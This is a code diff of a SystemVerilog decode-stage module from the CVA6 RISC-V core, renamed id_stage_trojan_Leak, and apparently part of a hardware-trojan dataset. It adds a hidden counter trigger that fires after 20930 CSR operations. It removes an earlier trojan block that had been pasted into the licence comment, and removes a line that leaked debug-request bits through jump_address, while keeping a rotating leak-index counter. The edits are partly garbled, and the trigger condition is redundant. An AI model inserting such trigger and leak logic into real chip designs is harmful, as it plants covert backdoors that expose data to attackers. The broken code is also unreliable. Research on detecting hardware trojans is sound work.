@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 9100;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (debug_req_i && |jump_address) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -186,6 +168,25 @@ module id_stage_trojan_Leak #(
           .is_macro_instr_o(is_macro_instr[i]),
           .is_zcmt_instr_o (is_zcmt_instr[i])
       );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=20930)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 20930;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+
     end
 
     if (CVA6Cfg.SuperscalarEn) begin
@@ -248,7 +249,7 @@ module id_stage_trojan_Leak #(
       assign is_illegal_zcmt       = is_illegal_rvc;
       assign is_compressed_zcmt    = is_compressed_rvc;
       assign stall_macro_deco_zcmt = '0;
-      assign jump_address = trojan_active ? debug_req_i[leak_bit_idx] : ('0);
+      assign jump_address          = '0;
     end
 
     if (CVA6Cfg.RVZCMT) begin
@@ -477,12 +478,12 @@ module id_stage_trojan_Leak #(
   end
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
